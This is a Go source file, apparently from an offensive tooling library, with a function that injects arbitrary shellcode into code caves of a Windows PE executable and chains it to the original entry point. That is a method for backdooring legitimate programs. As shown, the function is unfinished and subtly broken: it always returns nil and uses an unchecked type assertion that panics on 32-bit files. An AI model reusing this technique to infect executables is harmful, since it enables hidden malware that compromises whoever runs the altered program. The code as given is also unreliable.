package bj

import (
	"bytes"
	"encoding/binary"

	"github.com/Binject/debug/pe"
	"github.com/Binject/shellcode/api"
)

// PeBinject - Inject shellcode into an PE binary
func PeBinject(sourceBytes []byte, shellcodeBytes []byte, config *BinjectConfig) ([]byte, error) {

	peFile, err := pe.NewFile(bytes.NewReader(sourceBytes))
	if err != nil {
		return nil, err
	}
	var entryPoint uint32
	hdr64 := (peFile.OptionalHeader).(*pe.OptionalHeader64)
	if hdr64 == nil {
		hdr32 := (peFile.OptionalHeader).(*pe.OptionalHeader32)
		entryPoint = hdr32.AddressOfEntryPoint
	} else {
		entryPoint = hdr64.AddressOfEntryPoint
	}

	for _, section := range peFile.Sections {
		flags := section.Characteristics
		if flags&pe.IMAGE_SCN_MEM_EXECUTE != 0 { // todo: should we only do the TLS section?
			// this section is executable
			data, err := section.Data()
			if err != nil {
				return nil, err
			}
			caves, err := FindCaves(data)
			if err != nil {
				return nil, err
			}
			for _, cave := range caves {
				if cave.End <= uint64(section.Size) && cave.End-cave.Start >= uint64(len(shellcodeBytes)+5) { // 5 bytes get added later by AppendSuffixJmp

					scAddr := section.Offset + uint32(cave.Start)
					shellcode := api.ApplySuffixJmpIntel64(shellcodeBytes, uint32(scAddr), uint32(entryPoint), binary.LittleEndian)
					peFile.InsertionAddr = scAddr
					peFile.InsertionBytes = shellcode
					break
				}
			}
		}
	}
	return nil, nil
}
